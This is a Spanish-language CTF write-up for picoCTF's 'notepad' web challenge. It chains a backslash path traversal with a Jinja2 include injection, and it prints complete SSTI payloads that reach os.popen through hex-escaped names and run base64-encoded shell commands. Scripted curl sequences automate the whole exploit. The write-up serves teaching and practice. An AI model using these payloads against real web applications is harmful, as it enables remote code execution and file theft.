# Writeup: notepad
**Categoría:** Hard
**Fecha de conversión:** 2026-04-24

---

Writeup detallado del CTF "notepad"


Autor del reto: ginkoid

Plataforma: picoCTF

Nombre del desafío: notepad

Categoría: Hard (Web Exploitation)

Descripción: "This note-taking site seems a bit off."

Índice


```
    Análisis del código fuente

    Identificación de las vulnerabilidades

    Estrategia de explotación

    Desarrollo manual del exploit paso a paso

    Obtención de la flag

    Explicación de los payloads y por qué funcionan

```

1. Análisis del código fuente

Al descargar y extraer notepad.tar, obtenemos la siguiente estructura:

text


.

├── app.py

├── Dockerfile

├── static/

```bash
└── templates/
```

```
    ├── errors/
    │   ├── bad_content.html
    │   └── long_content.html
    └── index.html

```

1.1 app.py (versión resumida con comentarios)

python


from werkzeug.urls import url_fix

from secrets import token_urlsafe

from flask import Flask, request, render_template, redirect, url_for


app = Flask(__name__)


@app.route("/")

def index():

```
    # El parámetro 'error' se toma directamente de la URL y se pasa a la plantilla
    return render_template("index.html", error=request.args.get("error"))

```

@app.route("/new", methods=["POST"])

def create():

```
    content = request.form.get("content", "")
    # Filtro de caracteres prohibidos
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
    # url_fix convierte barras invertidas en barras normales
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)   # Se escribe todo el contenido (no solo los 128 primeros)
    return redirect(name)

```

Puntos clave:


```
    Los primeros 128 caracteres del contenido determinan la ruta y nombre del archivo (después de url_fix y añadir un token).

    El resto del contenido se escribe dentro del archivo sin ningún tipo de sanitización adicional.

    El filtro solo prohíbe los caracteres _ y / literales. No prohíbe \ (barra invertida).

    url_fix transforma \ en /, lo que permite path traversal escribiendo rutas como ..\..\carpeta\archivo.

```

1.2 templates/index.html

html


<!doctype html>

{% if error is not none %}

```
  <h3>
    error: {{ error }}
  </h3>
  {% include "errors/" + error + ".html" ignore missing %}
```

{% endif %}

<h2>make a new note</h2>

<form action="/new" method="POST">

```
  <textarea name="content"></textarea>
  <input type="submit">
```

</form>


Vulnerabilidad crítica:

La línea {% include "errors/" + error + ".html" ignore missing %} concatena el parámetro error directamente sin sanitización. Esto permite Server-Side Template Injection (SSTI) a través del mecanismo de inclusión de Jinja2. Si podemos controlar el contenido de un archivo .html dentro de templates/errors/, podremos inyectar código Jinja2 que se ejecutará al incluirse.

1.3 Dockerfile

dockerfile


FROM python:3.9.2-slim-buster

...

COPY app.py flag.txt ./

...

RUN mv flag.txt flag-$(cat /proc/sys/kernel/random/uuid).txt

...


La flag se renombra con un UUID aleatorio (por ejemplo, flag-c8f5526c-4122-4578-96de-d7dd27193798.txt) y se coloca en /app/ (el directorio de trabajo).

2. Identificación de las vulnerabilidades

Tenemos dos vulnerabilidades que se encadenan:


```
    Path traversal en la creación de notas
    Gracias a la conversión de \ en / por url_fix, podemos escribir archivos fuera del directorio static/. Por ejemplo, si el contenido comienza con ..\templates\errors\, el archivo se creará en templates/errors/ (que es un directorio existente y accesible por la aplicación).

    Server-Side Template Injection (SSTI) mediante inclusión de archivos
    Al incluir un archivo de error con {% include "errors/" + error + ".html" %}, el contenido de ese archivo se interpreta como plantilla Jinja2. Si podemos crear un archivo en templates/errors/ que contenga código Jinja2 malicioso, y luego forzar su inclusión a través del parámetro error, conseguiremos ejecución de código en el servidor.

```

Objetivo final: Leer el archivo de la flag en /app/flag-<uuid>.txt.

3. Estrategia de explotación

Para explotar esto manualmente, seguimos estos pasos:


```
    Crear un archivo en templates/errors/ cuyo contenido sea un payload SSTI que ejecute comandos del sistema o lea archivos. Para ello, el contenido de la nota debe comenzar con ..\templates\errors\ seguido de un nombre base (que formará parte del nombre del archivo) y luego el payload.
    Problema: El filtro prohibe _ y / en el contenido. Necesitamos un payload que no contenga esos caracteres literalmente.
    Solución: Usar escapes hexadecimales (\x5f por _, \x2f por /) o usar la función request["application"] para acceder a los builtins sin necesidad de escribir __globals__ literalmente (aunque internamente sí los usamos, pero con escapes). Otra opción es usar os.popen con comandos codificados en base64 para evitar barras.

    Obtener el nombre exacto del archivo que se ha creado. El servidor redirige a la URL del archivo (que estará en /templates/errors/... porque la ruta la hemos puesto al principio). Copiamos el nombre (sin la extensión) para usarlo en el parámetro error.

    Incluir ese archivo visitando /?error=NOMBRE. El servidor ejecutará el código Jinja2 contenido en el archivo y mostrará su salida en la página.

    Primera ejecución: Listar el directorio /app para conocer el nombre exacto de la flag (UUID).

    Segunda ejecución: Leer el archivo de la flag usando el UUID obtenido.

```

4. Desarrollo manual del exploit paso a paso

A continuación, detallo exactamente lo que hicimos en el navegador, explicando cada decisión.

4.1 Creación de la nota para listar /app


¿Por qué necesitamos relleno de 108 'a's?

El servidor toma los primeros 128 caracteres del contenido para construir el nombre del archivo. Si ponemos directamente el payload sin relleno, el payload se convertiría en parte del nombre del archivo, incluyendo caracteres como {, }, \x5f, etc., que luego darían problemas en la URL o serían malinterpretados. Para mantener el nombre del archivo limpio (solo letras y el token), hacemos que los primeros 128 caracteres sean la ruta ..\templates\errors\ (20 caracteres) más 108 caracteres 'a' (total 128). Así, el nombre del archivo será aaaaaaaa...-TOKEN.html, sin caracteres especiales. El payload empieza justo después de esos 128 caracteres, y se escribe en el contenido del archivo, no en el nombre.


Contenido exacto de la nota (copiar y pegar):

text


..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n bHMgL2FwcA== | base64 -d | bash")["read"]() %}{{a}}{% endwith %}


Desglose del **payload**:


```
    {% with a = ... %}{{a}}{% endwith %}: Asigna el resultado de la expresión a la variable a y luego la imprime. Es una forma de capturar la salida del comando.

    request["application"]: En Flask, request es un objeto global en las plantillas. request["application"] es el objeto app (la aplicación Flask). A través de él podemos acceder a __globals__, __builtins__, etc.

    ["\x5f\x5fglobals\x5f\x5f"]: Accede al atributo __globals__ usando la cadena con escapes hex. Como el filtro busca el carácter _ literal, \x5f no es detectado, pero Jinja2 lo interpreta como _ al evaluar.

    ["\x5f\x5fbuiltins\x5f\x5f"]: Similar para __builtins__.

    ["\x5f\x5fimport\x5f\x5f"]("os"): Obtiene la función __import__ y la llama con "os", importando el módulo os.

    ["popen"]("comando"): Ejecuta un comando del sistema. El comando está codificado en base64 para evitar escribir / y caracteres sospechosos.

    ["read"](): Lee la salida del comando.

```

¿Por qué base64?

El comando que queremos ejecutar es ls /app. Contiene una barra / (prohibida) y espacios. Al codificarlo en base64 (echo -n bHMgL2FwcA== | base64 -d | bash) evitamos escribir / directamente. El echo -n produce el texto base64, base64 -d lo decodifica, y bash lo ejecuta.


Comprobación de longitud:

La cadena de 108 'a' se generó con 9 grupos de 12 'a' cada uno. Para asegurarnos, usamos una cadena fija: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (108). El payload tiene unos 200 caracteres, total <512.


Proceso:


```
    Pegamos el contenido en el textarea del formulario.

    Hacemos clic en "Submit".

    El servidor redirige a una URL como:
    https://notepad.mars.picoctf.net/templates/errors/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-Y3Cv__xH9Tg.html

    Copiamos el nombre del archivo (sin .html):
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-Y3Cv__xH9Tg

```

4.2 Inclusión del archivo para obtener el listado


Visitamos:

https://notepad.mars.picoctf.net/?error=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-Y3Cv__xH9Tg


El servidor incluye el archivo en la plantilla y ejecuta el payload. El resultado aparece en la página (debajo del <h3>error: ...</h3>). Vemos:

text


..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapp.py flag-c8f5526c-4122-4578-96de-d7dd27193798.txt static templates


Interpretación:

El comando ls /app ha listado el contenido del directorio /app, mostrando app.py (el código fuente), el archivo de la flag con su UUID, y las carpetas static y templates. Ahora conocemos el nombre exacto de la **flag**: flag-c8f5526c-4122-4578-96de-d7dd27193798.txt.

4.3 Creación de la nota para leer la flag


Necesitamos un nuevo payload que ejecute cat /app/flag-c8f5526c-4122-4578-96de-d7dd27193798.txt. Codificamos el comando en base64:

bash


echo -n "cat /app/flag-c8f5526c-4122-4578-96de-d7dd27193798.txt" | base64

```bash
# Resultado: Y2F0IC9hcHAvZmxhZy1jOGY1NTI2Yy00MTIyLTQ1NzgtOTZkZS1kN2RkMjcxOTM3OTgudHh0
```


Contenido de la nueva nota (con las mismas 108 'a's):

text


..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n Y2F0IC9hcHAvZmxhZy1jOGY1NTI2Yy00MTIyLTQ1NzgtOTZkZS1kN2RkMjcxOTM3OTgudHh0 | base64 -d | bash")["read"]() %}{{a}}{% endwith %}


Enviamos el formulario. El servidor redirige a una nueva URL, por ejemplo:

https://notepad.mars.picoctf.net/templates/errors/aaaaaaaa...-dVEz3VCT1NM.html


Copiamos el nombre: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-dVEz3VCT1NM

4.4 Inclusión final para obtener la flag


Visitamos:

https://notepad.mars.picoctf.net/?error=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-dVEz3VCT1NM


La página muestra:

text


error: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-dVEz3VCT1NM

..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapicoCTF{************************************}


¡Flag obtenida!

5. Explicación de los payloads y por qué funcionan
5.1 Uso de request["application"]


En Jinja2, el objeto request está disponible por defecto en aplicaciones Flask. request["application"] es equivalente a request.application y devuelve el objeto de la aplicación Flask. Este objeto tiene un atributo __globals__ que contiene todas las variables globales del módulo, incluyendo __builtins__ y la función __import__. Al acceder a ellos mediante cadenas con escapes \x5f, evitamos la detección del filtro de _.

5.2 ¿Por qué __import__?


__import__ es una función incorporada que permite importar módulos dinámicamente. Con ella importamos os para ejecutar comandos del sistema mediante popen. Otra alternativa sería usar open directamente, pero open requiere la ruta del archivo y también tendríamos que esconder las barras. Usar os.popen con comandos base64 es más flexible y evita por completo las barras.

5.3 El truco del base64


El filtro rechaza cualquier contenido que contenga _ o /. Al codificar nuestro comando en base64, podemos escribir echo -n "base64..." | base64 -d | bash sin necesidad de usar / (excepto en base64 -d, pero ese comando no contiene /; es un nombre de programa). Además, echo y bash son comandos estándar. La tubería | no está prohibida. De esta forma, el payload final no contiene ningún carácter prohibido.

5.4 El relleno de 128 caracteres


El servidor usa content[:128] para generar el nombre del archivo. Si no ponemos relleno, el nombre incluirá partes del payload (como {{), lo que provocaría caracteres especiales en la URL y potenciales errores. Al rellenar con 'a's, el nombre del archivo es predecible y limpio. Además, garantizamos que el payload completo se escriba en el contenido del archivo, no en su nombre.

5.5 ¿Por qué la redirección va a /templates/errors/ y no a /static/?


Cuando el contenido comienza con ..\templates\errors\, url_fix lo convierte en ../templates/errors/. La ruta final es static/../templates/errors/..., que se normaliza a templates/errors/.... Como la aplicación tiene permisos de escritura en templates/errors/ (el Dockerfile hace chmod 1773 static templates/errors), el archivo se crea allí. Luego, al acceder a /?error=nombre, el servidor busca templates/errors/nombre.html, lo encuentra y lo incluye.

6. Conclusión

El reto combina un path traversal inducido por la conversión de \ a / y una inclusión dinámica de plantillas sin sanitización, permitiendo SSTI. Aprovechamos los escapes hexadecimales y la codificación base64 para evadir el filtro de caracteres prohibidos. Finalmente, ejecutamos comandos del sistema para listar el directorio y leer la flag.


### Flag final: picoCTF{**************************************************}

7. Lecciones aprendidas

```
    Nunca confiar en la sanitización de entrada si se pueden usar caracteres alternativos (\ en lugar de /).

    Las inclusiones dinámicas de plantillas (include con variable) son extremadamente peligrosas.

    Los escapes hexadecimales (\x5f) son una técnica común para evadir filtros basados en caracteres literales.

    El uso de base64 para ofuscar comandos es útil cuando hay restricciones de caracteres.

    El relleno de la entrada puede usarse para controlar qué parte se convierte en nombre de archivo y qué parte en contenido.

```

```bash
##Secuencia con curl
```


Vamos a generar los comandos curl para reproducir el ataque paso a paso, basados en lo que hicimos manualmente. Usaremos las URLs y nombres reales del ejemplo, pero notarás que algunos tokens y UUID son específicos de esa sesión. En un escenario real, deberás adaptar los comandos a los tokens y UUID que obtengas.


Aquí tienes la secuencia completa de comandos curl con explicaciones. Asumimos que la URL base es https://notepad.mars.picoctf.net.

1. Crear la nota para listar /app
bash


curl -X POST https://notepad.mars.picoctf.net/new \

```
  -d "content=..\\templates\\errors\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{% with a = request[\"application\"][\"\\x5f\\x5fglobals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"echo -n bHMgL2FwcA== | base64 -d | bash\")[\"read\"]() %}{{a}}{% endwith %}" \
  -L -v

```

El flag -L sigue la redirección. La respuesta incluirá la URL de redirección. Extraemos el nombre del archivo de la cabecera Location.


Para capturar el nombre automáticamente, podemos hacer:

bash


LOCATION=$(curl -X POST https://notepad.mars.picoctf.net/new \

```
  -d "content=..\\templates\\errors\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{% with a = request[\"application\"][\"\\x5f\\x5fglobals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"echo -n bHMgL2FwcA== | base64 -d | bash\")[\"read\"]() %}{{a}}{% endwith %}" \
  -s -D - -o /dev/null | grep -i location | cut -d' ' -f2 | tr -d '\r')

```

El nombre del archivo (sin .html) se extrae así:

bash


FILENAME=$(basename "$LOCATION" .html)

echo "Nombre del archivo: $FILENAME"


2. Incluir el archivo para obtener el listado
bash


curl "https://notepad.mars.picoctf.net/?error=$FILENAME"


La salida contendrá el listado de /app. Por ejemplo:

text


..\templates\errors\aaaaaaaa...app.py flag-c8f5526c-4122-4578-96de-d7dd27193798.txt static templates


Podemos extraer el UUID de la flag con grep -oP 'flag-[0-9a-f-]+\.txt'.

bash


### FLAG_FILE=$(curl -s "https://notepad.mars.picoctf.net/?error=$FILENAME" | grep -oP 'flag-[0-9a-f-]+\.txt' | head -1)

echo "Archivo de **flag**: $FLAG_FILE"


3. Crear la nota para leer la flag

Necesitamos construir el comando base64 para cat /app/$FLAG_FILE. Primero, generamos el base64 del comando (en bash):

bash


CMD="cat /app/$FLAG_FILE"

B64=$(echo -n "$CMD" | base64 | tr -d '\n')

echo "Base64: $B64"


Luego, creamos la nota con el nuevo **payload**:

bash


PAYLOAD="..\\templates\\errors\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{% with a = request[\"application\"][\"\\x5f\\x5fglobals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"echo -n $B64 | base64 -d | bash\")[\"read\"]() %}{{a}}{% endwith %}"


LOCATION2=$(curl -X POST https://notepad.mars.picoctf.net/new \

```
  -d "content=$PAYLOAD" \
  -s -D - -o /dev/null | grep -i location | cut -d' ' -f2 | tr -d '\r')
```

FILENAME2=$(basename "$LOCATION2" .html)


4. Incluir el archivo para obtener la flag
bash


curl -s "https://notepad.mars.picoctf.net/?error=$FILENAME2" | grep -oP 'picoCTF\{[^}]+\}'


Eso mostrará la flag.


Si prefieres una secuencia manual (sin scripts), aquí tienes los comandos individuales que deberías ejecutar en orden, reemplazando los valores según vayas obteniendo.

Secuencia manual con curl (sin extracción automática)


Paso 1: Crear primera nota (listar /app)

bash


curl -X POST https://notepad.mars.picoctf.net/new -d "content=..\\templates\\errors\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{% with a = request[\"application\"][\"\\x5f\\x5fglobals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"echo -n bHMgL2FwcA== | base64 -d | bash\")[\"read\"]() %}{{a}}{% endwith %}" -v


Observa la cabecera Location en la respuesta. Copia la URL. Ejemplo: https://notepad.mars.picoctf.net/templates/errors/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-Y3Cv__xH9Tg.html


Extrae el nombre: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-Y3Cv__xH9Tg


Paso 2: Obtener listado

bash


curl "https://notepad.mars.picoctf.net/?error=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-Y3Cv__xH9Tg"


En la salida, busca flag-xxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.txt. Anótalo.


Paso 3: Generar base64 del comando cat /app/flag-...txt. En tu terminal local:

bash


echo -n "cat /app/flag-c8f5526c-4122-4578-96de-d7dd27193798.txt" | base64


Obtendrás algo como Y2F0IC9hcHAvZmxhZy1jOGY1NTI2Yy00MTIyLTQ1NzgtOTZkZS1kN2RkMjcxOTM3OTgudHh0


Paso 4: Crear segunda nota con ese base64

bash


curl -X POST https://notepad.mars.picoctf.net/new -d "content=..\\templates\\errors\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{% with a = request[\"application\"][\"\\x5f\\x5fglobals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"echo -n Y2F0IC9hcHAvZmxhZy1jOGY1NTI2Yy00MTIyLTQ1NzgtOTZkZS1kN2RkMjcxOTM3OTgudHh0 | base64 -d | bash\")[\"read\"]() %}{{a}}{% endwith %}" -v


Copia el nuevo nombre de archivo de la Location.


Paso 5: Obtener la flag

bash


curl "https://notepad.mars.picoctf.net/?error=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-dVEz3VCT1NM"


La flag aparecerá en la salida.

